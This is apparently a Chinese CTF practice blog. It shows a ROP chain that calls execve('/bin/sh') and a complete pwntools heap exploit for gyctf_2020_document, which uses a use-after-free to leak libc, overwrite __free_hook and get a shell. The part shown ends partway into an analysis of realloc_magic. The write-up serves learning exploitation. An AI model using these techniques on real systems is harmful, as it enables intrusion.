class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">初始</span><br><span class="line">p &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b97c) # pop rax ; ret</span><br><span class="line">	p +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004005f6) # pop rdi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b9d5) # pop rdx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004011dc) # syscall</span><br><span class="line">	</span><br><span class="line">	发现很多多余的、</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	那么我的开始的想法是能不能利用</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 0x3a ; ret</span><br><span class="line">	来代替，但发现不行</span><br><span class="line">	网上查完发现应该写为</span><br><span class="line">	rop64 +&#x3D; p64(0x3b)</span><br></pre></td></tr></table></figure>

<p>这个0x3b是个系统调用号</p>
<img src="/2022/02/21/BUU%E5%88%B7%E9%A2%98-3/02/21/BUU%E5%88%B7%E9%A2%98-3/image-20220203154736012-1645447864230.png" class title="image-20220203154736012">

<p>那么我们推测出这里是将rax赋值0x3b，所以这里是通过构造值0x3b来利用pop函数来赋值</p>
<p>于是就合理了</p>
<h1 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a>gyctf_2020_document</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203155051490.png?raw=true" alt="image-20220203155051490.png"></p>
<p>运行流程</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203155119895.png?raw=true" alt="image-20220203155119895.png"></p>
<p>功能齐全</p>
<h2 id="利用IDA查看-1"><a href="#利用IDA查看-1" class="headerlink" title="利用IDA查看"></a>利用IDA查看</h2><p>add函数的奇怪定义，这里的输入是限制的且必须遵循</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203160858058.png?raw=true" alt="image-20220203160858058.png"></p>
<p>eidt</p>
<img src="/2022/02/21/BUU%E5%88%B7%E9%A2%98-3/02/21/BUU%E5%88%B7%E9%A2%98-3/image-20220203162818440-1645447864229.png" class title="image-20220203162818440">

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203162742286.png?raw=true" alt="image-20220203162742286.png"></p>
<p>edit的修改是在信息头的地址上加0x10</p>
<p>free函数中存在未清零—–指针悬挂—-可以泄露地址和利用unsortbin attack</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220203162933358.png?raw=true" alt="image-20220203162933358.png"></p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;gyctf_2020_document&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;gyctf_2020_document&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line">p &#x3D;remote(&#39;node4.buuoj.cn&#39;,27299)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def add(name,sex,comment):</span><br><span class="line">	p.sendlineafter(&#39;Give me your choice : &#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;input name&#39;,str(name))</span><br><span class="line">	p.sendlineafter(&#39;input sex&#39;,str(sex))</span><br><span class="line">	p.sendlineafter(&#39;input information&#39;,str(comment))</span><br><span class="line">def show(index):</span><br><span class="line">	p.sendlineafter(&#39;Give me your choice : &#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Give me your index : &#39;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,sex,comment):</span><br><span class="line">	p.sendlineafter(&#39;Give me your choice : &#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Give me your index : &#39;,str(index))</span><br><span class="line">	p.sendlineafter(&#39;Are you sure change sex?&#39;,str(sex))</span><br><span class="line">	p.sendlineafter(&#39;Now change information&#39;,str(comment))</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#39;Give me your choice : &#39;,&#39;4&#39;)		</span><br><span class="line">	p.sendlineafter(&#39;Give me your index : &#39;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&#39;1&#39;*7,&#39;a&#39;,&#39;a&#39;*0x70)#0</span><br><span class="line"></span><br><span class="line">add(&#39;2&#39;*7,&#39;b&#39;,&#39;b&#39;*0x70)#1</span><br><span class="line">#edit(1,&#39;9&#39;,&#39;qqqq&#39;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">malloc_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) -0x68</span><br><span class="line"></span><br><span class="line">#print(hex(malloc_addr))</span><br><span class="line">libc_base &#x3D; malloc_addr - libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">free_hook &#x3D; libc_base + libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">print(hex(free_hook))</span><br><span class="line">add(&#39;bin&#x2F;sh\x00&#39;,&#39;c&#39;,&#39;c&#39;*0x70)#2</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&#39;bin&#x2F;sh\x00&#39;,&#39;d&#39;,&#39;d&#39;*0x70)#3</span><br><span class="line">payload &#x3D; p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(1) + p64(0)*2 + p64(0)*8</span><br><span class="line">edit(0,&#39;8&#39;,payload)</span><br><span class="line">system_addr &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">payload &#x3D; p64(system_addr) + &#39;a&#39;*0x68</span><br><span class="line">edit(3,&#39;8&#39;,payload)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>1.程序add一个内容时会产生两个堆块</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207130133436.png?raw=true" alt="image-20220207130133436.png"></p>
<p>一个0x21大小的信息堆块，还有一个0x91大小的内容堆块根据IDA的分析可知在edit的时候修改的内容时在信息头前八字节的内容的基础上加0x10的位置进行修改，那么根据本次运行的结果，就是修改0x55e2a1brc040的内容</p>
<p>2.结合上述内容我们假如首先创建两个堆块，然后释放掉第一个创建的堆块（防止top chunk合并），此时我们的idex为0的信息堆块还在但内容堆块为0x91放入unsortbin中可以利用show功能泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(&#39;1&#39;*7,&#39;a&#39;,&#39;a&#39;*0x70)#0</span><br><span class="line">add(&#39;2&#39;*7,&#39;b&#39;,&#39;b&#39;*0x70)#1</span><br><span class="line">#edit(1,&#39;9&#39;,&#39;qqqq&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">malloc_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) -0x68</span><br><span class="line">libc_base &#x3D; malloc_addr - libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">free_hook &#x3D; libc_base + libc.symbols[&#39;__free_hook&#39;]</span><br></pre></td></tr></table></figure>

<p>3.那么泄露地址完之后我们需要能够修改free_hook或者malloc_hook的内容来达到get_shell</p>
<p>那么我们要怎么达到修改的目的呢？</p>
<p>我们知道在add的功能下首先会创建一个0x21大小的信息堆块，那么在我们释放了一个0x91的堆块的前提下，那么此时我们创建的0x21的堆块就会截取0x91的部分来进行创建，此时结合我们IDA的分析即我们仍可以利用idex==0的信息头来进行show和edit的操作，那么此时如果我们再次add一个信息头的堆块，是否可以利用idex==0的edit功能来修改第二次add的信息头的edit的地址呢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过idex&#x3D;&#x3D;0的信息头修改-----&gt;第二次add的信息头的操作地址即第一个八字节内容----&gt;利用第二个创建的edit来完成修改目的</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207131300542.png?raw=true" alt="image-20220207131300542.png"></p>
<p>我们发现我们的假设是成立的那么我们就可以完成get_shell了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(&#39;bin&#x2F;sh\x00&#39;,&#39;c&#39;,&#39;c&#39;*0x70)#2</span><br><span class="line">delete(1)</span><br><span class="line">add(&#39;bin&#x2F;sh\x00&#39;,&#39;d&#39;,&#39;d&#39;*0x70)#3</span><br><span class="line">payload &#x3D; p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(1) + p64(0)*2 + p64(0)*8</span><br><span class="line">edit(0,&#39;8&#39;,payload)</span><br></pre></td></tr></table></figure>

<p>4.get_shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">也可以用One_gadget</span><br><span class="line"></span><br><span class="line">one_gadget &#x3D; libc_base + 0x4526a#0x45216</span><br><span class="line">add(&#39;bin&#x2F;sh\x00&#39;,&#39;c&#39;,&#39;c&#39;*0x70)#2</span><br><span class="line">delete(1)</span><br><span class="line">add(&#39;bin&#x2F;sh\x00&#39;,&#39;d&#39;,&#39;d&#39;*0x70)#3</span><br><span class="line">payload &#x3D; p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(1) + p64(0)*2 + p64(0)*8</span><br><span class="line">edit(0,&#39;8&#39;,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system_addr &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">payload &#x3D; p64(one_gadget) + &#39;a&#39;*0x68</span><br><span class="line">edit(3,&#39;8&#39;,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure>

<p>参考链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;mcmuyanga&#x2F;article&#x2F;details&#x2F;115067726</span><br></pre></td></tr></table></figure>

<h1 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h1><h2 id="Checksec-1"><a href="#Checksec-1" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207131722210.png?raw=true" alt="image-20220207131722210.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207131746105.png?raw=true" alt="image-20220207131746105.png"></p>
<p>只有add和free</p>
<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p>发现了一个奇怪的函数入口</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207131859902.png?raw=true" alt="image-20220207131859902.png"></p>
<p>发现这个函数只能使用一次，使用后会修改realloc_ptr的值</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207131909470.png?raw=true" alt="image-20220207131909470.png"></p>
<p>这个值出现在add函数中</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207132031517.png?raw=true" alt="image-20220207132031517.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">realloc的几个特殊用法（摘自官方WP）</span><br><span class="line"></span><br><span class="line">size &#x3D;&#x3D; 0 ，这个时候等同于free</span><br><span class="line">realloc_ptr &#x3D;&#x3D; 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc</span><br><span class="line">malloc_usable_size(realloc_ptr) &gt;&#x3D; size， 这个时候等同于edit</span><br><span class="line">malloc_usable_size(realloc_ptr) &lt; szie， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</span><br><span class="line"></span><br><span class="line">realloc的返回值为地址值</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207133200862.png?raw=true" alt="image-20220207133200862.png"></p>
<p>我们发现了我们虽然没有直接给出edit函数，但是可以利用realloc函数的性质来达到edit的目的</p>
<p>我们先测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;1111&#39;)</span><br><span class="line">add(0,&#39;1&#39;)</span><br><span class="line">add(0x100,&#39;2222&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207133338077.png?raw=true" alt="image-20220207133338077.png"></p>
<p>也就是说我们的add(0,’1’)这样的操作确实可以相当于free</p>
<p>那么我们接下来尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;1111&#39;)</span><br><span class="line">#add(0,&#39;&#39;)</span><br><span class="line">free()</span><br><span class="line">add(0x100,&#39;2222&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207133554945.png?raw=true" alt="image-20220207133554945.png"></p>
<p>发现这这里为什么那个绿色的free chunk不见了</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207133653476.png?raw=true" alt="image-20220207133653476.png"></p>
<p>但Bins中确实存在这样一个free chunk</p>
<p>那么此时我们再修改一下来检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;111111111111111111&#39;)</span><br><span class="line">#add(0,&#39;&#39;)</span><br><span class="line">free()</span><br><span class="line">add(0x100,&#39;2222&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207133938172.png?raw=true" alt="image-20220207133938172.png"></p>
<p>发现此时的内容相当于edit了那么属于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_usable_size(realloc_ptr) &gt;&#x3D; size， 这个时候等同于edit</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.那么我们现在已知运行在2.27版本中，那么我们可以先利用tcache来使一个堆块进去unsortbin</p>
<p>但又因为我们到时候是要利用edit来进行修改的那么此时我们就需要首先创建一个小堆块，因为等等要满足malloc_usable_size(realloc_ptr) &gt;= size，并且为了防止top chunk合并还需要再add一个那么我们此时需要add三个堆块先,且大小顺序为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&gt;1,3随意但注意后面不要重复使用</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;111111111111111111&#39;)</span><br><span class="line">add(0,&#39;&#39;)</span><br><span class="line">add(0x100,&#39;2222&#39;)</span><br><span class="line">add(0,&#39;&#39;)</span><br><span class="line">add(0x140,&#39;3333&#39;)</span><br><span class="line">add(0,&#39;&#39;)</span><br><span class="line">add(0x100,&#39;a&#39;)</span><br><span class="line">for i in range(7):</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>

<p>但这时候发现刚刚好填满了tcache，我们应该要再次free一次，但这时候我们应该要用free()还是add(0,’’)呢，我们分析一下，如果是使用free是可以进入Unsortbin，但我们接下来还是要继续add的那么就不能够达到修改的目的了，那么我们就选择add(0,’’)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为每一次新的reallco就需要将ptr置为0</span><br></pre></td></tr></table></figure>

<p>2.既然是堆题目，那么这时候我们就要想办法达到show的功能来获得偏移</p>
<p>这时候就需要学到一个新的关键结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200417183148316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0NTgyMA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>我们利用GDB查看该结构体位置</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220207162439294.png?raw=true" alt="image-20220207162439294.png"></p>
<p>发现与main_arena+96地址除了后四位皆相同，我们知道地址随机并不是完全随机的，第三位是不会改变的那么我们只要修改一位并进行尝试即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们随机选一个数字如8760----16分之一的机会</span><br></pre></td></tr></table></figure>

<p>那么我们应该怎么构造修改这个地址呢？</p>
